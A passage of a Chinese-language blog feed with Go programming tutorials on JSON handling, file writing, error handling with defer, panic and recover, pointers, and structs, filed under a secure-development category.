class="string">`&#123;&quot;num&quot;:6.13,&quot;strs&quot;:[&quot;a&quot;,&quot;b&quot;]&#125;`</span>)</span><br><span class="line"><span class="comment">// 我们需要提供一个 JSON 包可以存放解码数据的变量。</span></span><br><span class="line"><span class="comment">// 这里的 map[string]interface&#123;&#125; 将保存一个 string 为键，值为任意值的map。</span></span><br><span class="line"><span class="keyword">var</span> dat <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="comment">// 这里就是实际的解码和相关的错误检查。</span></span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal(byt, &amp;dat); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(dat)</span><br><span class="line"><span class="comment">// 为了使用解码 map 中的值，我们需要将他们进行适当的类型转换。</span></span><br><span class="line"><span class="comment">// 例如这里我们将 num 的值转换成 float64类型。</span></span><br><span class="line">num := dat[<span class="string">&quot;num&quot;</span>].(<span class="type">float64</span>)</span><br><span class="line">fmt.Println(num)</span><br><span class="line"><span class="comment">// 访问嵌套的值需要一系列的转化。</span></span><br><span class="line">strs := dat[<span class="string">&quot;strs&quot;</span>].([]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">str1 := strs[<span class="number">0</span>].(<span class="type">string</span>)</span><br><span class="line">fmt.Println(str1)</span><br><span class="line"><span class="comment">// 我们也可以解码 JSON 值到自定义类型。</span></span><br><span class="line"><span class="comment">// 这个功能的好处就是可以为我们的程序带来额外的类型安全加强，并且消除在访问数据时的类型断言。</span></span><br><span class="line">str := <span class="string">`&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;peach&quot;]&#125;`</span></span><br><span class="line">res := Response2&#123;&#125;</span><br><span class="line">json.Unmarshal([]<span class="type">byte</span>(str), &amp;res)</span><br><span class="line">fmt.Println(res)</span><br><span class="line">fmt.Println(res.Fruits[<span class="number">0</span>])</span><br><span class="line"><span class="comment">// 在上面的例子中，我们经常使用 byte 和 string 作为使用标准输出时数据和 JSON 表示之间的中间值。</span></span><br><span class="line"><span class="comment">// 我们也可以和os.Stdout 一样，直接将 JSON 编码直接输出至 os.Writer流中，或者作为 HTTP 响应体。</span></span><br><span class="line">enc := json.NewEncoder(os.Stdout)</span><br><span class="line">d := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;apple&quot;</span>: <span class="number">5</span>, <span class="string">&quot;lettuce&quot;</span>: <span class="number">7</span>&#125;</span><br><span class="line">enc.Encode(d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Go 写文件和我们前面看过的读操作有着相似的方式。</span></span><br><span class="line"><span class="comment">// 读取文件需要经常进行错误检查，这个帮助方法可以精简下面的错误检查过程。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(e <span class="type">error</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(e)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">d1 := []<span class="type">byte</span>(<span class="string">&quot;hello\ngo\n&quot;</span>)</span><br><span class="line"><span class="comment">// 开始，这里是展示如写入一个字符串（或者只是一些字节）到一个文件。</span></span><br><span class="line">err := ioutil.WriteFile(<span class="string">&quot;D:/study/dat1&quot;</span>, d1, <span class="number">0644</span>)</span><br><span class="line">check(err)</span><br><span class="line"><span class="comment">// 对于更细粒度的写入，先打开一个文件。</span></span><br><span class="line">f, err := os.Create(<span class="string">&quot;D:/study/dat2&quot;</span>)</span><br><span class="line">check(err)</span><br><span class="line"><span class="comment">// 打开文件后，习惯立即使用 defer 调用文件的 Close操作。</span></span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"><span class="comment">// 你可以写入你想写入的字节切片</span></span><br><span class="line">d2 := []<span class="type">byte</span>&#123;<span class="number">115</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">10</span>&#125;</span><br><span class="line">n2, err := f.Write(d2)</span><br><span class="line">check(err)</span><br><span class="line">fmt.Printf(<span class="string">&quot;wrote %d bytes\n&quot;</span>, n2)</span><br><span class="line"><span class="comment">// WriteString 也是可用的。</span></span><br><span class="line">n3, err := f.WriteString(<span class="string">&quot;writes\n&quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;wrote %d bytes\n&quot;</span>, n3)</span><br><span class="line"><span class="comment">// 调用 Sync 来将缓冲区的信息写入磁盘。</span></span><br><span class="line">f.Sync()</span><br><span class="line"><span class="comment">// bufio 提供了和我们前面看到的带缓冲的读取器一样的带缓冲的写入器。</span></span><br><span class="line">w := bufio.NewWriter(f)</span><br><span class="line">n4, err := w.WriteString(<span class="string">&quot;buffered\n&quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;wrote %d bytes\n&quot;</span>, n4)</span><br><span class="line"><span class="comment">// 使用 Flush 来确保所有缓存的操作已写入底层写入器。</span></span><br><span class="line">w.Flush()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 错误处理</title>
      <link href="/2025/03/04/golang%E7%9A%84%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"/>
      <url>/2025/03/04/golang%E7%9A%84%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Go-错误处理"><a href="#Go-错误处理" class="headerlink" title="Go 错误处理"></a>Go 错误处理</h1><h2 id="一、错误"><a href="#一、错误" class="headerlink" title="一、错误"></a>一、错误</h2><p>在Go中有一部分函数总是能成功的运行。比如strings.Contains和strconv.FormatBool函数；对于大部分函数而言，永远无法确保能否成功运行。</p><p>Go 语言通过内置的错误接口提供了非常简单的错误处理机制。</p><p>error类型是一个接口类型，这是它的定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以在编码中通过实现 error 接口类型来生成错误信息。</p><p>函数通常在最后的返回值中返回错误信息。使用errors.New 可返回一个错误信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sqrt</span><span class="params">(f <span class="type">float64</span>)</span></span> (<span class="type">float64</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> f &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">&quot;math: square root of negative number&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个错误处理的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照惯例，错误通常是最后一个返回值并且是 error 类型，一个内建的接口。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(arg <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// errors.New 构造一个使用给定的错误信息的基本error 值。</span></span><br><span class="line"><span class="keyword">if</span> arg == <span class="number">42</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, errors.New(<span class="string">&quot;can&#x27;t work with 42&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回错误值为 nil 代表没有错误。</span></span><br><span class="line"><span class="keyword">return</span> arg + <span class="number">3</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过实现 Error 方法来自定义 error 类型是可以的。</span></span><br><span class="line"><span class="comment">// 这里使用自定义错误类型来表示上面的参数错误。</span></span><br><span class="line"><span class="keyword">type</span> argError <span class="keyword">struct</span> &#123;</span><br><span class="line">arg  <span class="type">int</span></span><br><span class="line">prob <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *argError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d - %s&quot;</span>, e.arg, e.prob)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f2</span><span class="params">(arg <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> arg == <span class="number">42</span> &#123;</span><br><span class="line"><span class="comment">// 在这个例子中，我们使用 &amp;argError 语法来建立一个新的结构体，并提供了 arg 和 prob 这个两个字段的值。</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, &amp;argError&#123;arg, <span class="string">&quot;can&#x27;t work with it&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arg + <span class="number">3</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 下面的两个循环测试了各个返回错误的函数。</span></span><br><span class="line"><span class="comment">//  注意在 if行内的错误检查代码，在 Go 中是一个普遍的用法。</span></span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">42</span>&#125; &#123;</span><br><span class="line"><span class="keyword">if</span> r, e := f1(i); e != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f1 失败:&quot;</span>, e)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f1 工作:&quot;</span>, r)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">42</span>&#125; &#123;</span><br><span class="line"><span class="keyword">if</span> r, e := f2(i); e != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f2 失败:&quot;</span>, e)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f2 工作:&quot;</span>, r)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 你如果想在程序中使用一个自定义错误类型中的数据，你需要通过类型断言来得到这个错误类型的实例。</span></span><br><span class="line">_, e := f2(<span class="number">42</span>)</span><br><span class="line"><span class="keyword">if</span> ae, ok := e.(*argError); ok &#123;</span><br><span class="line">fmt.Println(ae.arg)</span><br><span class="line">fmt.Println(ae.prob)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、Deferred函数"><a href="#二、Deferred函数" class="headerlink" title="二、Deferred函数"></a>二、Deferred函数</h2><p>defer语句经常被用于处理成对的操作，如打开、关闭、连接、断开连接、加锁、释放锁。通过defer机制，不论函数逻辑多复杂，都能保证在任何执行路径下，资源被释放。释放资源的defer应该直接跟在请求资源的语句后。</p><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 假设我们想要创建一个文件，向它进行写操作，然后在结束时关闭它。</span></span><br><span class="line"><span class="comment">// 这里展示了如何通过 defer 来做到这一切。</span></span><br><span class="line">f := createFile(<span class="string">&quot;D:/defer.txt&quot;</span>) <span class="comment">// f := createFile(&quot;/tmp/defer.txt&quot;)</span></span><br><span class="line"><span class="comment">// 在 closeFile 后得到一个文件对象，我们使用 defer通过 closeFile 来关闭这个文件。这会在封闭函数（main）结束时执行，就是 writeFile 结束后。</span></span><br><span class="line"><span class="keyword">defer</span> closeFile(f)</span><br><span class="line">writeFile(f)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createFile</span><span class="params">(p <span class="type">string</span>)</span></span> *os.File &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;creating&quot;</span>)</span><br><span class="line">f, err := os.Create(p)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> f</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeFile</span><span class="params">(f *os.File)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;writing&quot;</span>)</span><br><span class="line">fmt.Fprintln(f, <span class="string">&quot;data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closeFile</span><span class="params">(f *os.File)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;closing&quot;</span>)</span><br><span class="line">f.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、异常"><a href="#三、异常" class="headerlink" title="三、异常"></a>三、异常</h2><p>Go的类型系统会在编译时捕获很多错误，但有些错误只能在运行时检查，如数组访问越界、空指针引用等。这些运行时错误会引起painc异常。</p><p>示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 我们将在这个网站中使用 panic 来检查预期外的错误。这个是唯一一个为 panic 准备的例子。</span></span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;一个异常&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// panic 的一个基本用法就是在一个函数返回了错误值但是我们并不知道（或者不想）处理时终止运行。</span></span><br><span class="line"><span class="comment">// 这里是一个在创建一个新文件时返回异常错误时的panic 用法。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;继续&quot;</span>)</span><br><span class="line">_, err := os.Create(<span class="string">&quot;/tmp/file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 运行程序将会引起 panic，输出一个错误消息和 Go 运行时栈信息，并且返回一个非零的状态码。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、捕获异常"><a href="#四、捕获异常" class="headerlink" title="四、捕获异常"></a>四、捕获异常</h2><p>通常来说，不应该对panic异常做任何处理，但有时，也许我们可以从异常中恢复，至少我们可以在程序崩溃前，做一些操作。举个例子，当web服务器遇到不可预料的严重问题时，在崩溃前应该将所有的连接关闭；如果不做任何处理，会使得客户端一直处于等待状态。如果web服务器还在开发阶段，服务器甚至可以将异常信息反馈到客户端，帮助调试。</p><p>如果在deferred函数中调用了内置函数recover，并且定义该defer语句的函数发生了panic异常，recover会使程序从panic中恢复，并返回panic value。导致panic异常的函数不会继续运行，但能正常返回。在未发生panic时调用recover，recover会返回nil。</p><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里我们对异常进行了捕获</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> p := <span class="built_in">recover</span>(); p != <span class="literal">nil</span> &#123;</span><br><span class="line">err := fmt.Errorf(<span class="string">&quot;internal error: %v&quot;</span>, p)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们将在这个网站中使用 panic 来检查预期外的错误。这个是唯一一个为 panic 准备的例子。</span></span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;一个异常&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang的指针&#92;结构体&#92;接口</title>
      <link href="/2025/03/04/golang%E6%8C%87%E9%92%88%E7%BB%93%E6%9E%84%E4%BD%93%E6%8E%A5%E5%8F%A3/"/>
      <url>/2025/03/04/golang%E6%8C%87%E9%92%88%E7%BB%93%E6%9E%84%E4%BD%93%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="golang的指针-结构体-接口"><a href="#golang的指针-结构体-接口" class="headerlink" title="golang的指针\结构体\接口"></a>golang的指针\结构体\接口</h1><h2 id="一、什么是指针"><a href="#一、什么是指针" class="headerlink" title="一、什么是指针"></a><strong>一、什么是指针</strong></h2><p>C语言里，变量存放在内存中，而<strong>内存其实就是一组有序字节组成的数组</strong>，每个字节有唯一的内存地址。CPU 通过内存寻址对存储在内存中的某个指定数据对象的地址进行定位。这里，数据对象是指存储在内存中的一个指定数据类型的数值或字符串，它们都有一个自己的地址，而指针便是保存这个地址的变量。也就是说：<strong>指针是一种保存变量地址的变量</strong>。</p><p><img src="/09.golang%E6%8C%87%E9%92%88%E7%BB%93%E6%9E%84%E4%BD%93%E6%8E%A5%E5%8F%A3.assets/765389-20180918115659254-712651853.png" alt="img"></p><h2 id="二、Go-指针"><a href="#二、Go-指针" class="headerlink" title="二、Go 指针"></a>二、Go 指针</h2><p>指针如何定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ip *<span class="type">int</span>        <span class="comment">/* 指向整型*/</span></span><br><span class="line"><span class="keyword">var</span> fp *<span class="type">float32</span>    <span class="comment">/* 指向浮点型 */</span></span><br></pre></td></tr></table></figure><p>指针使用流程：</p><ul><li>定义指针变量。</li><li>为指针变量赋值。</li><li>访问指针变量中指向地址的值。</li></ul><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们将通过两个函数：val 和 ptr 来比较指针和值类型的不同。</span></span><br><span class="line"><span class="comment">// val 有一个 int 型参数，所以使用值传递。</span></span><br><span class="line"><span class="comment">// val 将从调用它的那个函数中得到一个 val1 形参的拷贝。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">val</span><span class="params">(val1 <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">val1 = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ptr 有一和上面不同的 *int 参数，意味着它用了一个 int指针。</span></span><br><span class="line"><span class="comment">// 函数体内的 *iptr 接着解引用 这个指针，从它内存地址得到这个地址对应的当前值。</span></span><br><span class="line"><span class="comment">// 对一个解引用的指针赋值将会改变这个指针引用的真实地址的值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ptr</span><span class="params">(iptr *<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">*iptr = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">test := <span class="number">1</span></span><br><span class="line">fmt.Println(<span class="string">&quot;initial:&quot;</span>, test)</span><br><span class="line">val(test)</span><br><span class="line">fmt.Println(<span class="string">&quot;val:&quot;</span>, test)</span><br><span class="line"><span class="comment">// 通过 &amp;test 语法来取得 test 的内存地址，例如一个变量i 的指针。</span></span><br><span class="line">ptr(&amp;test)</span><br><span class="line">fmt.Println(<span class="string">&quot;ptr:&quot;</span>, test)</span><br><span class="line"><span class="comment">// 指针也是可以被打印的。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;pointer:&quot;</span>, &amp;test)</span><br><span class="line"><span class="comment">// val 在 main 函数中不能改变 test 的值，但是zeroptr 可以，因为它有一个这个变量的内存地址的引用。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;pointer:&quot;</span>, *&amp;test)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、Go-空指针"><a href="#三、Go-空指针" class="headerlink" title="三、Go 空指针"></a>三、Go 空指针</h2><p>当一个指针被定义后没有分配到任何变量时，它的值为 nil。</p><p>nil 指针也称为空指针。</p><p>nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。</p><h2 id="四、什么结构体"><a href="#四、什么结构体" class="headerlink" title="四、什么结构体"></a>四、什么结构体</h2><p>Go 语言中数组可以存储同一类型的数据，但在结构体中我们可以为不同项定义不同的数据类型。</p><p>结构体是由一系列具有相同类型或不同类型的数据构成的数据集合。</p><p>结构体表示一项记录，比如保存图书馆的书籍记录，每本书有以下属性：</p><ul><li>Title ：标题</li><li>Author ： 作者</li><li>Subject：学科</li><li>ID：书籍ID</li></ul><h2 id="五、定义结构体"><a href="#五、定义结构体" class="headerlink" title="五、定义结构体"></a>五、定义结构体</h2><p>结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type struct_variable_type struct &#123;</span><br><span class="line">   member definition</span><br><span class="line">   member definition</span><br><span class="line">   ...</span><br><span class="line">   member definition</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面我们看下示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的 person 结构体包含了 name 和 age 两个字段。</span></span><br><span class="line"><span class="keyword">type</span> person 